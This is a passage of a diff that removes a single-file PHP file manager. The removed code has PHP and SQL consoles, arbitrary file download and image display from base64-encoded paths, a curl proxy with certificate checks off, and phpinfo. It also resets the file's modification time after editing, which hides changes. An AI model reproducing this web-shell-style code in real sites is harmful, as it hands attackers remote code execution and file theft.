-				if ($_POST['fm_login']['login'] != $auth['login']) $msg .= ' '.__('Login').': '.$_POST['fm_login']['login'];
-				if ($_POST['fm_login']['password'] != $auth['password']) $msg .= ' '.__('Password').': '.$_POST['fm_login']['password'];
-				$auth = $_POST['fm_login'];
-			}
-			else $msg .= __('Error occurred');
-			if (!empty($fm_config['fm_restore_time'])) touch(__FILE__,$filemtime);
-		}
-	} elseif (isset($_POST['tpl_edited'])) { 
-		$lng_tpl = $_POST['tpl_edited'];
-		if (!empty($_POST[$lng_tpl.'_name'])) {
-			$fm_php = json_encode(array_combine($_POST[$lng_tpl.'_name'],$_POST[$lng_tpl.'_value']),JSON_HEX_APOS);
-		} elseif (!empty($_POST[$lng_tpl.'_new_name'])) {
-			$fm_php = json_encode(json_decode(${$lng_tpl.'_templates'},true)+array($_POST[$lng_tpl.'_new_name']=>$_POST[$lng_tpl.'_new_value']),JSON_HEX_APOS);
-		}
-		if (!empty($fm_php)) {
-			$fgc = file_get_contents(__FILE__);
-			$search = preg_match('#'.$lng_tpl.'_templates[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $fgc, $matches);
-			if (!empty($matches[1])) {
-				$filemtime = filemtime(__FILE__);
-				$replace = str_replace('{"'.$matches[1].'"}',$fm_php,$fgc);
-				if (file_put_contents(__FILE__, $replace)) {
-					${$lng_tpl.'_templates'} = $fm_php;
-					$msg .= __('File updated');
-				} else $msg .= __('Error occurred');
-				if (!empty($fm_config['fm_restore_time'])) touch(__FILE__,$filemtime);
-			}	
-		} else $msg .= __('Error occurred');
-	}
-}
-
-// Just show image
-if (isset($_GET['img'])) {
-	$file=base64_decode($_GET['img']);
-	if ($info=getimagesize($file)){
-		switch  ($info[2]){	//1=GIF, 2=JPG, 3=PNG, 4=SWF, 5=PSD, 6=BMP
-			case 1: $ext='gif'; break;
-			case 2: $ext='jpeg'; break;
-			case 3: $ext='png'; break;
-			case 6: $ext='bmp'; break;
-			default: die();
-		}
-		header("Content-type: image/$ext");
-		echo file_get_contents($file);
-		die();
-	}
-}
-
-// Just download file
-if (isset($_GET['download'])) {
-	$file=base64_decode($_GET['download']);
-	fm_download($file);	
-}
-
-// Just show info
-if (isset($_GET['phpinfo'])) {
-	phpinfo(); 
-	die();
-}
-
-// Mini proxy, many bugs!
-if (isset($_GET['proxy']) && (!empty($fm_config['enable_proxy']))) {
-	$url = isset($_GET['url'])?urldecode($_GET['url']):'';
-	$proxy_form = '
-<div style="position:relative;z-index:100500;background: linear-gradient(to bottom, #e4f5fc 0%,#bfe8f9 50%,#9fd8ef 51%,#2ab0ed 100%);">
-	<form action="" method="GET">
-	<input type="hidden" name="proxy" value="true">
-	'.fm_home().' <a href="'.$url.'" target="_blank">Url</a>: <input type="text" name="url" value="'.$url.'" size="55">
-	<input type="submit" value="'.__('Show').'" class="fm_input">
-	</form>
-</div>
-';
-	if ($url) {
-		$ch = curl_init($url);
-		curl_setopt($ch, CURLOPT_USERAGENT, 'Den1xxx test proxy');
-		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
-		curl_setopt($ch, CURLOPT_HEADER, 0);
-		curl_setopt($ch, CURLOPT_REFERER, $url);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
-		$result = curl_exec($ch);
-		curl_close($ch);
-		//$result = preg_replace('#(src)=["\'][http://]?([^:]*)["\']#Ui', '\\1="'.$url.'/\\2"', $result);
-		$result = preg_replace_callback('#(href|src)=["\'][http://]?([^:]*)["\']#Ui', 'fm_url_proxy', $result);
-		$result = preg_replace('%(<body.*?>)%i', '$1'.'<style>'.fm_home_style().'</style>'.$proxy_form, $result);
-		echo $result;
-		die();
-	} 
-}
-?>
-<!doctype html>
-<html>
-<head>     
-	<meta charset="utf-8" />
-	<meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title><?=__('File manager')?></title>
-<style>
-body {
-	background-color:	white;
-	font-family:		Verdana, Arial, Helvetica, sans-serif;
-	font-size:			8pt;
-	margin:				0px;
-}
-
-a:link, a:active, a:visited { color: #006699; text-decoration: none; }
-a:hover { color: #DD6900; text-decoration: underline; }
-a.th:link { color: #FFA34F; text-decoration: none; }
-a.th:active { color: #FFA34F; text-decoration: none; }
-a.th:visited { color: #FFA34F; text-decoration: none; }
-a.th:hover {  color: #FFA34F; text-decoration: underline; }
-
-table.bg {
-	background-color: #ACBBC6
-}
-
-th, td { 
-	font:	normal 8pt Verdana, Arial, Helvetica, sans-serif;
-	padding: 3px;
-}
-
-th	{
-	height:				25px;
-	background-color:	#006699;
-	color:				#FFA34F;
-	font-weight:		bold;
-	font-size:			11px;
-}
-
-.row1 {
-	background-color:	#EFEFEF;
-}
-
-.row2 {
-	background-color:	#DEE3E7;
-}
-
-.row3 {
-	background-color:	#D1D7DC;
-	padding: 5px;
-}
-
-tr.row1:hover {
-	background-color:	#F3FCFC;
-}
-
-tr.row2:hover {
-	background-color:	#F0F6F6;
-}
-
-.whole {
-	width: 100%;
-}
-
-.all tbody td:first-child{width:100%;}
-
-textarea {
-	font: 9pt 'Courier New', courier;
-	line-height: 125%;
-	padding: 5px;
-}
-
-.textarea_input {
-	height: 1em;
-}
-
-.textarea_input:focus {
-	height: auto;
-}
-
-input[type=submit]{
-	background: #FCFCFC none !important;
-	cursor: pointer;
-}
-
-.folder {
-    background-image: url("data:image/png;base64,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");
-}
-
-.file {
-    background-image: url("data:image/png;base64,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");
-}
-<?=fm_home_style()?>
-.img {
-	background-image: 
-url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");
-}
-@media screen and (max-width:720px){
-  table{display:block;}
-    #fm_table td{display:inline;float:left;}
-    #fm_table tbody td:first-child{width:100%;padding:0;}
-    #fm_table tbody tr:nth-child(2n+1){background-color:#EFEFEF;}
-    #fm_table tbody tr:nth-child(2n){background-color:#DEE3E7;}
-    #fm_table tr{display:block;float:left;clear:left;width:100%;}
-	#header_table .row2, #header_table .row3 {display:inline;float:left;width:100%;padding:0;}
-	#header_table table td {display:inline;float:left;}
-}
-</style>
-</head>
-<body>
-<?php
-$url_inc = '?fm=true';
-if (isset($_POST['sqlrun'])&&!empty($fm_config['enable_sql_console'])){
-	$res = empty($_POST['sql']) ? '' : $_POST['sql'];
-	$res_lng = 'sql';
-} elseif (isset($_POST['phprun'])&&!empty($fm_config['enable_php_console'])){
-	$res = empty($_POST['php']) ? '' : $_POST['php'];
-	$res_lng = 'php';
-} 
-if (isset($_GET['fm_settings'])) {
-	echo ' 
-<table class="whole">
-<form method="post" action="">
-<tr><th colspan="2">'.__('File manager').' - '.__('Settings').'</th></tr>
-'.(empty($msg)?'':'<tr><td class="row2" colspan="2">'.$msg.'</td></tr>').'
-'.fm_config_checkbox_row(__('Show size of the folder'),'show_dir_size').'
-'.fm_config_checkbox_row(__('Show').' '.__('pictures'),'show_img').'
-'.fm_config_checkbox_row(__('Show').' '.__('Make directory'),'make_directory').'
-'.fm_config_checkbox_row(__('Show').' '.__('New file'),'new_file').'
-'.fm_config_checkbox_row(__('Show').' '.__('Upload'),'upload_file').'
-'.fm_config_checkbox_row(__('Show').' PHP version','show_php_ver').'
-'.fm_config_checkbox_row(__('Show').' PHP ini','show_php_ini').'
-'.fm_config_checkbox_row(__('Show').' '.__('Generation time'),'show_gt').'
-'.fm_config_checkbox_row(__('Show').' xls','show_xls').'
-'.fm_config_checkbox_row(__('Show').' PHP '.__('Console'),'enable_php_console').'
-'.fm_config_checkbox_row(__('Show').' SQL '.__('Console'),'enable_sql_console').'
-<tr><td class="row1"><input name="fm_config[sql_server]" value="'.$fm_config['sql_server'].'" type="text"></td><td class="row2 whole">SQL server</td></tr>
-<tr><td class="row1"><input name="fm_config[sql_username]" value="'.$fm_config['sql_username'].'" type="text"></td><td class="row2 whole">SQL user</td></tr>
-<tr><td class="row1"><input name="fm_config[sql_password]" value="'.$fm_config['sql_password'].'" type="text"></td><td class="row2 whole">SQL password</td></tr>
-<tr><td class="row1"><input name="fm_config[sql_db]" value="'.$fm_config['sql_db'].'" type="text"></td><td class="row2 whole">SQL DB</td></tr>
-'.fm_config_checkbox_row(__('Show').' Proxy','enable_proxy').'
-'.fm_config_checkbox_row(__('Show').' phpinfo()','show_phpinfo').'
-'.fm_config_checkbox_row(__('Show').' '.__('Settings'),'fm_settings').'
-'.fm_config_checkbox_row(__('Restore file time after editing'),'restore_time').'
-'.fm_config_checkbox_row(__('File manager').': '.__('Restore file time after editing'),'fm_restore_time').'
-<tr><td class="row3"><a href="'.fm_url().'?fm_settings=true&fm_config_delete=true">'.__('Reset settings').'</a></td><td class="row3"><input type="submit" value="'.__('Save').'" name="fm_config[fm_set_submit]"></td></tr>
-</form>
-</table>
-<table>
-<form method="post" action="">
-<tr><th colspan="2">'.__('Settings').' - '.__('Authorization').'</th></tr>
-<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($auth['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>
-<tr><td class="row1"><input name="fm_login[login]" value="'.$auth['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>
-<tr><td class="row1"><input name="fm_login[password]" value="'.$auth['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>
-<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$auth['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>
-<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$auth['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
-<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$auth['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>
-<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>
-</form>
-</table>';
-echo fm_tpl_form('php'),fm_tpl_form('sql');
-} elseif (isset($proxy_form)) {
-	die($proxy_form);
-} elseif (isset($res_lng)) {	
-?>
-<table class="whole">
-<tr>
-    <th><?=__('File manager').' - '.$path?></th>
-</tr>
-<tr>
-    <td class="row2"><table><tr><td><h2><?=strtoupper($res_lng)?> <?=__('Console')?><?php
-	if($res_lng=='sql') echo ' - Database: '.$fm_config['sql_db'].'</h2></td><td>'.fm_run_input('php');
-	else echo '</h2></td><td>'.fm_run_input('sql');
-	?></td></tr></table></td>
-</tr>
-<tr>
-    <td class="row1">
-		<a href="<?=$url_inc.'&path=' . $path;?>"><?=__('Back')?></a>
-		<form action="" method="POST" name="console">
-		<textarea name="<?=$res_lng?>" cols="80" rows="10" style="width: 90%"><?=$res?></textarea><br/>
-		<input type="reset" value="<?=__('Reset')?>">
-		<input type="submit" value="<?=__('Submit')?>" name="<?=$res_lng?>run">
-<?php
-$str_tmpl = $res_lng.'_templates';
-$tmpl = !empty($$str_tmpl) ? json_decode($$str_tmpl,true) : '';
-if (!empty($tmpl)){
-	$active = isset($_POST[$res_lng.'_tpl']) ? $_POST[$res_lng.'_tpl'] : '';
